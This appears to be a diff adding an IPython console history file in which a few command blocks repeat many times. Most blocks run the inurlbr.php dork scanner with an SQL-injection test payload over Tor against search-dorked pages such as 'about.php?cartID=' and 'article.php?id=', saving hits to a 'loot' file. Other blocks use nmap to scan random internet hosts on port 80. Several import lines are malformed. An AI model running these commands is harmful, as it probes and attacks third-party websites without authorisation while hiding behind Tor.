@@ -1,0 +1,518 @@
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+! resource/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php resource/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php resource/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /root/stuff/Qt5/Scanner/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork cart_validate.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork tuangou.php?bookid= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork tuangou.php?bookid= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork tuangou.php?bookid= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork comments_form.php?ID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 3 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork comments_form.php?ID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 3 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork comments_form.php?ID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 3 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork article.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 4 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork comments_form.php?ID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 3 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork article.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 4 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 26 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork comments_form.php?ID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 3 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork article.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 4 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork cart_validate.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork content.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork content.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork content.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork content.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork about.php?cartID= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from modules.Helper import Toolsfrom IPython.utils import * 
+import nmap,os,sys,re,subprocess
+!php /usr/bin/inurlbr.php --dork content.php?id= --exploit-get "'0x27%27'" -q 1,2,3,4,5,6 --mp 1 -s resources/Inurl_Loot.txt --tor-random
+%save -r -a /root/stuff/Qt5/Scanner/resource/console_history 0-500
+!cat resource/resources/Inurl_Loot.txt.ipy
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
+import modules.Helper as Helper
+from IPython.utils import io
+import nmap,os,sys,re,subprocess
+Nm = nmap.PortScanner()
+Nm.scan(hosts=" -iR 4 ", arguments=" -Pn -n -p 80")
+hosts_list = [(x, Nm[x]['status']['state']) for x in Nm.all_hosts()]
+ip_list = [(hosts_list[x][0]) for x in range(len(hosts_list))]
+filename = 'resource/outfile.lst'
+with open(filename, 'a') as outfile:
+	for entries in ip_list:
+		outfile.write(entries)
+		outfile.write(',')
+%save -r -a resource/console_history 0-500
